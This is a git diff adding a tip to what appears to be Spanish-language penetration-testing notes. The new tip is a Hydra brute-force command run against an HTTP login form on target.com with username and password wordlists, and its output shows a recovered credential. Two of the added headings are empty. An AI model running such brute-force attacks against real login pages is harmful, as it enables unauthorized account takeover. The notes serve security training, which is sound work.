@@ -468,6 +468,20 @@ Read data files from: /usr/share/nmap
 Ahora cuando queramos iniciar un ataque al puerto ```8080``` de la maquina remota todos los comandos los debemos enviar a nuestro puerto local ```1234``` y SSH se encargara del resto.
 
 ## Tip #10: Fuerza bruta con hydra al protocolo HTTP
+## Simple http login
+## Custom http login
+```bash
+┌──(root㉿pentest)-[~]
+└─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /root/Desktop/wordlists/100-common-passwords.txt target.com http-post-form \ "/login:username=^USER^&password=^PASS^&Login=Login:Invalid username or password"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 04:57:44
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1700 login tries (l:17/p:100), ~107 tries per task
+[DATA] attacking http-post-form://target.com:80/login:username=^USER^&password=^PASS^&Login=Login:Invalid username or password
+[80][http-post-form] host: target.com   login: robert   password: password1
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-14 04:58:05
+```
 ## Tip #11: Busqueda de informacion con grep
 ```bash
 root@pentest:/app# ls
